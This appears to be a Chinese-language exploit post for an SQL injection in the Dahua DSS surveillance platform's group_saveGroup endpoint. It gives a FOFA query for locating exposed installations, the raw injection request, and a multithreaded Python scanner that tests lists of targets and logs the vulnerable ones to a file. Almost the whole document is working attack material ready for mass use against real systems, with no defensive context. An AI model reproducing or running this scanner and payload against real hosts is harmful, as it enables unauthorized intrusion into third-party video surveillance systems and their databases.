FOFA

```markdown
app="dahua-DSS"
```

payload

```markdown
GET /emap/group_saveGroup?groupName=1'%20and%202333=2333%20and%20'hami'='hami&groupDesc=1 HTTP/1.1
Host: 
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0


```

![image-20240914112024575](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240914112024575.png)

poc

```python
import sys, requests, argparse, re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 定义程序的横幅
def banner():
    test = """

██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    

                                                    data: 2024-09-14
                                                    version: 1.0
                                                    author: hulless-oat
"""
    print(test)

# 主函数，解析命令行参数并调用相应的功能函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="大华DSS系统group_saveGroup存在SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
def poc(target):
    payload = "/emap/group_saveGroup?groupName=1'%20and%202333=2333%20and%20'hami'='hami&groupDesc=1"
    url = target + payload
    headers = {
        "Accept-Encoding": "identity",
        "Accept-Language": "zh-CN,zh;q=0.8",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info",
        'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
    }
    try:
        res = requests.get(url=url, headers=headers, timeout=10, verify=False)
        if res.status_code == 200 and "点击返回至WPMS主页面" in res.text :
            print(f"{GREEN}[+]该网站存在SQL注入漏洞：{target}\n{RESET}")
            with open("result.txt", "a", encoding="utf-8") as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]该网站不存在SQL注入漏洞")
    except Exception as e:
        print(f"[*]该网站无法访问")

# 程序入口点
if __name__ == '__main__':
    main()
```

